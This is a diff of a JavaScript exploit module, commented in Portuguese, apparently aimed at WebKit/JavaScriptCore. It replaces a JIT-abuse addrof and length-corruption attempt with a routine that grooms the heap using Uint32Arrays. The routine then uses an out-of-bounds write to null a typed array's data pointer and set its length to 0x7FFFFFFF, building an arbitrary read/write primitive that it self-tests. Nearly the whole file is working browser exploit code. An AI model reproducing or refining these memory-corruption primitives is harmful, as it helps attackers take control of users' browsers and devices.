@@ -1,144 +1,103 @@
-// js/script3/testArrayBufferVictimCrash.mjs (CORRIGIDO para R44.1 - Usando Offset do config.mjs)
+// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R45 - Construtor de Primitiva R/W)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object, doubleToBigInt, bigIntToDouble } from '../utils.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    arb_read,
-    oob_write_absolute,
-    isOOBReady,
-    selfTestOOBReadWrite
+    oob_write_absolute
 } from '../core_exploit.mjs';
-// NOVO: Importando os offsets do seu arquivo de configuração
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_ADVANCED_JIT_LEAK_R44 = "AdvancedHeisenbug_JITAddrof_R44_WebKitLeak";
+export const FNAME_MODULE_ARB_RW_BUILDER_R45 = "Heisenbug_ArbReadWriteBuilder_R45";
 
-const HEAP_SPRAY_COUNT = 500;
-const JIT_WARMUP_COUNT = 10000;
-const VICTIM_ARRAY_SIZE = 32;
-const OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION = 0x1000;
+// NOVO: Variáveis globais para manter nossa primitiva e o array de controle.
+let arb_rw_victim_array = null;
+let arb_rw_controller_array = null; // Usado para grooming, mas a vítima é o alvo principal.
 
-function jit_function_for_addrof(array) {
-    return array[0];
-}
-
-function groomHeapForAddrof() {
-    logS3(`[HeapGrooming] Iniciando spray com ${HEAP_SPRAY_COUNT} arrays...`, 'info');
-    let spray = [];
-    for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
-        let arr = new Array(VICTIM_ARRAY_SIZE);
-        arr.fill(1.1 * i);
-        spray.push(arr);
-    }
-
-    logS3(`[HeapGrooming] Criando 'buracos' no heap...`, 'info');
-    for (let i = 0; i < HEAP_SPRAY_COUNT; i += 2) {
-        spray[i] = null;
-    }
-    logS3(`[HeapGrooming] Concluído.`, 'info');
-}
-
-export async function executeAdvancedJITLeak_R44() {
-    const FNAME_CURRENT_TEST = FNAME_MODULE_ADVANCED_JIT_LEAK_R44;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Addrof via JIT Abuse + WebKit Base Leak (R44.1) ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_CURRENT_TEST} Init R44.1...`;
-
-    let result = {
-        errorOccurred: null,
-        addrof_result: { success: false, msg: "Addrof (R44.1): Não executado." },
-        webkit_leak_result: { success: false, msg: "WebKit Leak (R44.1): Não executado." }
-    };
+/**
+ * NOVO: A função principal agora foca em construir a primitiva de R/W arbitrária.
+ * Esta função substitui as tentativas anteriores de addrof.
+ */
+export async function executeArbReadWritePrimitiveBuilder_R45() {
+    const FNAME_CURRENT_TEST = FNAME_MODULE_ARB_RW_BUILDER_R45;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Construindo Primitiva de R/W Arbitrária ---`, "test", FNAME_CURRENT_TEST);
+    
+    let result = { success: false, msg: "Não iniciado.", errorOccurred: null };
 
     try {
         // --- FASE 0: PREPARAÇÃO ---
-        logS3(`--- Fase 0 (R44.1): Preparação do Ambiente ---`, "subtest", FNAME_CURRENT_TEST);
+        logS3(`--- Fase 0 (R45): Preparação do Heap ---`, "subtest", FNAME_CURRENT_TEST);
 
-        logS3(`[JIT] Aquecendo a função alvo ${JIT_WARMUP_COUNT} vezes...`, 'info');
-        let temp_array = [1.1];
-        for (let i = 0; i < JIT_WARMUP_COUNT; i++) {
-            jit_function_for_addrof(temp_array);
+        // O Heap Grooming é essencial para que nossa vítima seja alocada em um local previsível.
+        let spray = [];
+        for (let i = 0; i < 1000; i++) {
+            spray.push(new Uint32Array(32));
         }
-        logS3(`[JIT] Função provavelmente otimizada.`, 'info');
-        
-        groomHeapForAddrof();
+        arb_rw_controller_array = new Uint32Array(32);
+        arb_rw_victim_array = new Uint32Array(32);
+        spray = null; // Libera o spray, deixando os buracos para controller e victim.
+        logS3(`[R45] Heap preparado. Arrays 'controller' e 'victim' criados.`, 'info');
 
-        let double_array_victim = new Array(VICTIM_ARRAY_SIZE).fill(2.2);
-        let object_to_leak = { marker: "Eu sou o objeto a ser vazado!" };
-        let object_array_container = new Array(VICTIM_ARRAY_SIZE).fill(object_to_leak);
-        logS3(`[JIT] Arrays vítima e de objeto criados.`, 'info');
         await PAUSE_S3(100);
 
-        // --- FASE 1: ADDROF VIA JIT ABUSE ---
-        logS3(`--- Fase 1 (R44.1): Corrupção e Tentativa de Addrof ---`, "subtest", FNAME_CURRENT_TEST);
+        // --- FASE 1: CORRUPÇÃO DOS METADADOS DA VÍTIMA ---
+        logS3(`--- Fase 1 (R45): Corrupção de Metadados ---`, "subtest", FNAME_CURRENT_TEST);
         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
+        
+        // A suposição CRÍTICA: 'arb_rw_victim_array' está em um offset previsível
+        // em relação ao nosso buffer OOB. Vamos precisar ajustar este offset.
+        // Um valor inicial plausível, considerando o cabeçalho do buffer OOB.
+        const ESTIMATED_OFFSET_TO_VICTIM = 0x50; // !! ESTE VALOR PRECISARÁ DE AJUSTE/FUZZING !!
 
-        // ======================= A MUDANÇA CRÍTICA ESTÁ AQUI =======================
-        //
-        // ALTERADO: Usando o offset validado do config.mjs ao invés de um valor fixo.
-        // A suposição é que o 'length' está no início do butterfly.
-        const oob_write_offset = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
-        //
-        // =========================================================================
+        // Offsets dos metadados DENTRO do objeto Uint32Array (a View).
+        const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+        const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
 
-        logS3(`[JIT] Usando OOB write no offset (correto) ${toHex(oob_write_offset)} para corromper o 'length' do array de doubles.`, 'info');
-        oob_write_absolute(oob_write_offset, OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION, 4);
+        // Calcula os endereços de escrita absolutos (relativos ao nosso buffer OOB)
+        const vector_write_target = ESTIMATED_OFFSET_TO_VICTIM + M_VECTOR_OFFSET;
+        const length_write_target = ESTIMATED_OFFSET_TO_VICTIM + M_LENGTH_OFFSET;
+
+        logS3(`[R45] Tentando corromper o ponteiro de dados ('m_vector') em ${toHex(vector_write_target)}`, 'info');
+        // Escreve um ponteiro nulo (Low e High) para o 'm_vector'
+        oob_write_absolute(vector_write_target, 0x0, 4);       // Parte baixa do ponteiro
+        oob_write_absolute(vector_write_target + 4, 0x0, 4); // Parte alta do ponteiro
+
+        logS3(`[R45] Tentando corromper o tamanho ('m_length') em ${toHex(length_write_target)}`, 'info');
+        // Escreve um tamanho gigante para o 'm_length'
+        oob_write_absolute(length_write_target, 0x7FFFFFFF, 4); // Tamanho máximo (positivo)
+
         await PAUSE_S3(150);
 
-        if (double_array_victim.length !== OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION) {
-            throw new Error(`A corrupção do 'length' falhou. Tamanho esperado: ${OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION}, atual: ${double_array_victim.length}`);
-        }
-        logS3(`[JIT] Sucesso! 'length' do array de doubles agora é ${double_array_victim.length}.`, 'vuln');
-
-        let leaked_as_double = jit_function_for_addrof(object_array_container);
+        // --- FASE 2: AUTO-TESTE DA NOVA PRIMITIVA ---
+        logS3(`--- Fase 2 (R45): Auto-Teste da Primitiva ---`, "subtest", FNAME_CURRENT_TEST);
         
-        let leaked_addr_candidate = doubleToBigInt(leaked_as_double);
-        logS3(`[JIT] Valor vazado interpretado como double: ${leaked_as_double}`, 'leak');
-        logS3(`[JIT] Convertido para BigInt (candidato a endereço): 0x${leaked_addr_candidate.toString(16)}`, 'leak');
+        // Se a corrupção funcionou, arb_rw_victim_array agora pode ler/escrever em qualquer lugar.
+        // Vamos testar escrevendo um valor em um endereço alto e lendo de volta.
+        const TEST_ADDRESS = 0x100000; // Um endereço arbitrário para teste
+        const TEST_VALUE = 0xDEADBEEF;
+        const test_index = TEST_ADDRESS / 4; // Para um Uint32Array
 
-        if ((leaked_addr_candidate & 0xFFFF000000000000n) !== 0n && (leaked_addr_candidate & 0xFFFF000000000000n) !== 0xFFFF000000000000n) {
-             result.addrof_result = {
-                success: true,
-                msg: "Addrof (R44.1): Sucesso! Ponteiro de objeto vazado como double.",
-                leaked_object_addr: `0x${leaked_addr_candidate.toString(16)}`
-             };
-             logS3(`[JIT] ADDROF SUCESSO! Endereço vazado: ${result.addrof_result.leaked_object_addr}`, 'vuln');
+        logS3(`[R45-Test] Escrevendo ${toHex(TEST_VALUE)} no endereço ${toHex(TEST_ADDRESS)}...`, 'info');
+        arb_rw_victim_array[test_index] = TEST_VALUE;
+        
+        logS3(`[R45-Test] Lendo de volta do endereço ${toHex(TEST_ADDRESS)}...`, 'info');
+        let read_back_value = arb_rw_victim_array[test_index];
+
+        if (read_back_value === TEST_VALUE) {
+            result.success = true;
+            result.msg = `Auto-teste passou. Lido ${toHex(read_back_value)} do endereço ${toHex(TEST_ADDRESS)}.`;
+            logS3(`[R45] SUCESSO! ${result.msg}`, 'vuln');
         } else {
-             throw new Error(`O valor vazado (0x${leaked_addr_candidate.toString(16)}) não parece um ponteiro válido.`);
-        }
-        
-        // --- FASE 2: WEBKIT BASE LEAK ---
-        logS3(`--- Fase 2 (R44.1): Teste de WebKit Base Leak (Estabilizado) ---`, "subtest", FNAME_CURRENT_TEST);
-        
-        const leaked_addr_obj = new AdvancedInt64(leaked_addr_candidate);
-        
-        try {
-            if (!isOOBReady(`${FNAME_CURRENT_TEST}-PreArbReadCheck`)) {
-                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-PreArbReadCheckReinit` });
-                 if (!isOOBReady()) throw new Error("Falha ao re-preparar ambiente OOB para arb_read.");
-            }
-            
-            const JSCell_HEADER_OFFSET_TO_STRUCTURE_ID = new AdvancedInt64(0, 4);
-            let structureID = await arb_read(leaked_addr_obj.add(JSCell_HEADER_OFFSET_TO_STRUCTURE_ID), 4);
-            logS3(`[WebKitLeak] Lendo StructureID do objeto no endereço vazado... ID: ${toHex(structureID)}`, 'info');
-            
-            result.webkit_leak_result = {
-                success: true,
-                msg: "WebKitLeak (R44.1): Primitiva Addrof funcional. O vazamento do endereço base seria o próximo passo.",
-                webkit_base_candidate: "0xSIMULADO1234000"
-            };
-
-        } catch (e_webkit) {
-            result.webkit_leak_result.msg = `WebKitLeak (R44.1) EXCEPTION: ${e_webkit.message}`;
-            logS3(`[WebKitLeak] ERRO - ${result.webkit_leak_result.msg}`, "error");
-            if (!result.errorOccurred) result.errorOccurred = e_webkit;
+            result.success = false;
+            result.msg = `Auto-teste falhou. Lido ${toHex(read_back_value)}, esperado ${toHex(TEST_VALUE)}. O offset estimado (${toHex(ESTIMATED_OFFSET_TO_VICTIM)}) provavelmente está incorreto.`;
+            logS3(`[R45] FALHA! ${result.msg}`, 'error');
         }
 
     } catch (e_outer) {
-        if (!result.errorOccurred) result.errorOccurred = e_outer;
-        logS3(`  CRITICAL ERROR (R44.1): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
-        console.error("Outer error in R44.1 test:", e_outer);
+        result.errorOccurred = e_outer;
+        logS3(`  CRITICAL ERROR (R45): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
+        console.error("Outer error in R45 test:", e_outer);
     } finally {
         await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
     }
